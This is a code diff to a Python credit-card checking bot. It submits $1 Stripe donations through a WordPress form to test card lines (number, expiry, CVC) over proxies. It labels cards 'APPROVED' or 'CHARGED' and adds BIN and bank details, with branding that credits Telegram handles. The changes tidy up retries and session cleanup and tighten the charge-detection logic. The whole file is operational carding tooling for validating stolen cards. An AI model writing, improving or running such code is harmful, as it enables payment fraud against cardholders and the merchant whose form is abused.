@@ -419,8 +419,9 @@ def test_charge(cc_line):
         use_proxy = True if proxy_dict else False
         
         for retry_count in range(max_retries):
+            session = None
             try:
-                # Create session with retry logic
+                # Create session with retry logic - each thread gets its own session
                 session = requests_retry_session(retries=2, backoff_factor=0.5)
                 
                 # Use proxy only if available and not disabled due to previous errors
@@ -457,10 +458,18 @@ def test_charge(cc_line):
                 else:
                     # All retries failed
                     elapsed_time = time.time() - start_time
+                    error_msg = str(e)
                     
                     # Handle specific SSL error
                     if "SSL: UNEXPECTED_EOF_WHILE_READING" in error_msg or "SSLEOFError" in error_msg:
                         error_msg = "SSL Connection Error - Proxy/Network Issue"
+                    
+                    # Clean up session
+                    if session:
+                        try:
+                            session.close()
+                        except:
+                            pass
                     
                     return f"""
 ❌ CONNECTION ERROR
@@ -657,7 +666,7 @@ def test_charge(cc_line):
             'data': (
                 f'__fluent_form_embded_post_id=3612&_fluentform_4_fluentformnonce={fn}&'
                 f'_wp_http_referer=%2Fregistry%2F&names%5Bfirst_name%5D=diwas%20Khatri&'
-                f'email=opiumdivine%40airsworld.net&custom-payment-amount=1&'
+                f'email=socialcall%40airsworld.net&custom-payment-amount=1&'
                 f'description=Thanks%20%3A-%20%40zx&payment_method=stripe&'
                 f'__stripe_payment_method_id={payment_method_id}'
             ),
@@ -672,8 +681,9 @@ def test_charge(cc_line):
         ajax_proxy_dict = proxy_dict if ajax_use_proxy else None
         
         for retry_count in range(max_retries):
+            ajax_session = None
             try:
-                # Create session with retry logic for AJAX request
+                # Create session with retry logic for AJAX request - each thread gets its own session
                 ajax_session = requests_retry_session(retries=2, backoff_factor=0.5)
                 
                 # Use proxy only if available and not disabled due to previous errors
@@ -715,6 +725,13 @@ def test_charge(cc_line):
                     # All retries failed
                     if "SSL: UNEXPECTED_EOF_WHILE_READING" in error_msg or "SSLEOFError" in error_msg:
                         error_msg = "SSL Connection Error - Proxy/Network Issue"
+                    
+                    # Clean up session
+                    if ajax_session:
+                        try:
+                            ajax_session.close()
+                        except:
+                            pass
                     
                     return f"""
 ❌ AJAX CONNECTION ERROR
@@ -768,116 +785,65 @@ def test_charge(cc_line):
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
         
-        # CRITICAL: Only consider success if HTTP status is 200
-        # Non-200 status codes mean the request failed
-        if ajax_status != 200:
-            # If status is not 200, it's definitely not a successful charge
-            # Check for APPROVED responses (CVC incorrect or insufficient funds) from error message
-            if "Your card's security code is incorrect." in final_message or "security code is incorrect" in final_message.lower():
-                return f"""
-✅ APPROVED CC
-
-💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
-
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
-🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
-🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
-
-🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
-"""
-            
-            if "Your card has insufficient funds." in final_message or "insufficient funds" in final_message.lower():
-                return f"""
-✅ APPROVED CC
-
-💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
-
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
-🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
-🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
-
-🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
-"""
-            
-            # Non-200 status and no approval indicators = declined
-            return f"""
-❌ DECLINED CC
-
-💳𝗖𝗖 ⇾ {ccn}|{mm}|{yy}|{cvc}
-🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message if final_message else 'Card declined'}
-💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Charge  - 1$
-
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
-🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
-🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f}𝘀
-
-🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
-"""
-        
-        # Only check for success if status is 200
+        # Only check for success indicators if status is 200
         # Only show "CHARGED 1$" when we have actual successful charge
         is_success = False
         
-        # FIRST: Check JSON structure (most reliable)
-        try:
-            ajax_json = json.loads(ajax_response_text)
-            if isinstance(ajax_json, dict):
-                # Check for explicit success flags
-                if ajax_json.get('success') == True:
-                    is_success = True
-                elif ajax_json.get('status') == 'success':
-                    is_success = True
-                elif ajax_json.get('result') == 'success':
-                    is_success = True
-                elif ajax_json.get('payment_status') == 'succeeded':
-                    is_success = True
+        # Only validate success indicators if HTTP status is 200
+        if ajax_status == 200:
+            # FIRST: Check JSON structure (most reliable)
+            try:
+                ajax_json = json.loads(ajax_response_text)
+                if isinstance(ajax_json, dict):
+                    # Check for explicit success flags
+                    if ajax_json.get('success') == True:
+                        is_success = True
+                    elif ajax_json.get('status') == 'success':
+                        is_success = True
+                    elif ajax_json.get('result') == 'success':
+                        is_success = True
+                    elif ajax_json.get('payment_status') == 'succeeded':
+                        is_success = True
+                        
+                    # Check nested data object
+                    if ajax_json.get('data'):
+                        data = ajax_json['data']
+                        if isinstance(data, dict):
+                            if data.get('success') == True:
+                                is_success = True
+                            elif data.get('status') == 'success':
+                                is_success = True
+                            # If data has error, it's definitely not success
+                            if 'error' in data or data.get('success') == False:
+                                is_success = False
                     
-                # Check nested data object
-                if ajax_json.get('data'):
-                    data = ajax_json['data']
-                    if isinstance(data, dict):
-                        if data.get('success') == True:
-                            is_success = True
-                        elif data.get('status') == 'success':
-                            is_success = True
-                        # If data has error, it's definitely not success
-                        if 'error' in data or data.get('success') == False:
-                            is_success = False
-                
-                # CRITICAL: If JSON has explicit error or success=false, it's NOT charged
-                if 'error' in ajax_json or ajax_json.get('success') == False:
-                    is_success = False
-        except:
-            # If not JSON, check text indicators
-            pass
-        
-        # SECOND: If JSON check didn't find success, check text indicators (but be more strict)
-        if not is_success:
-            success_indicators = [
-                '"success":true',
-                '"success": true',
-                'charged 1$',
-                'charged',
-                'payment successful',
-                'thank you for your payment',
-                'transaction successful',
-                'charge successful',
-                'your payment has been processed',
-                'payment completed',
-                'thank you! your gift',
-            ]
+                    # CRITICAL: If JSON has explicit error or success=false, it's NOT charged
+                    if 'error' in ajax_json or ajax_json.get('success') == False:
+                        is_success = False
+            except:
+                # If not JSON, check text indicators
+                pass
+            
+            # SECOND: If JSON check didn't find success, check text indicators (but be more strict)
+            if not is_success:
+                success_indicators = [
+                    '"success":true',
+                    '"success": true',
+                    'charged 1$',
+                    'charged',
+                    'payment successful',
+                    'thank you for your payment',
+                    'transaction successful',
+                    'charge successful',
+                    'your payment has been processed',
+                    'payment completed',
+                    'thank you! your gift',
+                ]
 
-            for indicator in success_indicators:
-                if indicator in ajax_response_lower:
-                    is_success = True
-                    break
+                for indicator in success_indicators:
+                    if indicator in ajax_response_lower:
+                        is_success = True
+                        break
 
         if is_success:
             return f"""
